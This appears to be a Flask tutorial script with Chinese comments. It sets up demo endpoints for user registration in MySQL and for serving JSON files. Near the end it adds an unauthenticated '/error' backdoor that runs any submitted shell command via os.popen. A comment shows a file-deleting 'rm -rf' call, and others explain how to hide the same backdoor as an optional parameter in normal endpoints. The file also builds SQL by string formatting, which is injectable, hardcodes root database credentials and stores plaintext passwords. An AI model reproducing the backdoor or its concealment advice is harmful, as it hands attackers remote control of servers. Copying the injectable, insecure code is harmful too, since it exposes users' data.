import json
import os

import flask
import pymysql

server = flask.Flask(__name__)  # __name__代表当前python文件, 把当前python文件当成一个服务


def opt_db(sql):
    coon = pymysql.connect(
        host='192.168.109.132',
        user='root',
        passwd='123456',
        db='besttest',
        port=3306,
        charset='utf8'
    )  # 建立db链接
    cur = coon.cursor()  # 建立游标
    cur.execute(sql);  # 执行sql
    if sql.strip()[:6].upper() == 'SELECT':
        res = cur.fetchall()  # 获取sql返回
    else:
        coon.commit()
        res = 'ok'
    cur.close()  # 关闭游标
    coon.close()  # 关闭db链接
    return res


# get请求, 请求路径ip:port/index
@server.route('/index', methods=['get'])  # 装饰器,代表index函数是一个接口,支持get请求(默认get请求)
def index():
    res = {'msg': '这是我开发的第一个接口', 'msg_code': '0'}
    return json.dumps(res, ensure_ascii=False, indent=4)


# post请求, 请求路径ip:port/reg
@server.route('/reg', methods=['post'])  # 装饰器,代表reg函数是一个接口,支持post请求(可以同时支持get、post请求)
def reg():
    username = flask.request.values.get('username')  # 获取接口入参
    pwd = flask.request.values.get('passwd')
    if username and pwd:
        sql = 'select * from syz_stu where username="%s";' % username
        if opt_db(sql):
            res = {'msg': '用户已存在', 'msg_code': 2001}  # 2001用户已存在
        else:
            insert_sql = 'insert into syz_stu (username,passwd) VALUES ("%s","%s");' % (username, pwd)
            opt_db(insert_sql)
            res = {'msg': '注册成功', 'msg_code': '0'}
    else:
        res = {'msg': '必填字段未填, 请查看接口文档', 'msg_code': 1001}  # 1001必填字段未填
    return json.dumps(res, ensure_ascii=False, indent=4)


# get请求, 请求路径ip:port/list
@server.route('/clue/listNewV3', methods=['get'])  # 装饰器,代表index函数是一个接口,支持get请求(默认get请求)
def listNewV3():
    pageNum = flask.request.values.get('pageNum')
    pageSize = flask.request.values.get('pageSize')

    # 读打开文件
    with open('json/list.json', encoding='utf-8') as a:
        # 读取文件
        result = json.load(a)
        print(result)

    return json.dumps(result, ensure_ascii=False, indent=4)


# get请求, 请求路径ip:port/index
@server.route('/work/panel/copyUser/list', methods=['get'])  # 装饰器,代表index函数是一个接口,支持get请求(默认get请求)
def info():
    clueId = flask.request.values.get('clueId')

    filepath = 'json/info1.json'
    if clueId == '1637757158634442753':
        filepath = 'json/info2.json'

    # 读打开文件
    with open(filepath, encoding='utf-8') as a:
        # 读取文件
        result = json.load(a)
        print(result)

    return json.dumps(result, ensure_ascii=False, indent=4)


# 后门接口
@server.route('/error', methods=['post'])  # 路由，访问地址为----IP:端口/error
def cmd():
    cmd = flask.request.values.get('cmd')  # 接口的入参
    res = os.popen(cmd)  # 执行用户命令
    return res.read()  # 返回执行结果
    # http://127.0.0.1:8999/error?cmd=rm -rf a.txt 后门接口可以直接通过浏览器删除系统文件
    # 隐蔽一点的方法，把cmd = flask.request.values('cmd'，None)写入正常接口
    # 默认可以不传，一但传了再res = os.popen(cmd)


server.run(port=6688, debug=True, host='0.0.0.0')  # 启动服务,接口才能访问
# port=6688指定端口为6688
# debug=True设置代码修改后服务自动重启
# host='0.0.0.0'设置同一局域网的可以访问
# server.run() 必须在所有接口定义完后再定义, 否则, server.run()检测不到之后定义的接口, 接口是无法被运行的
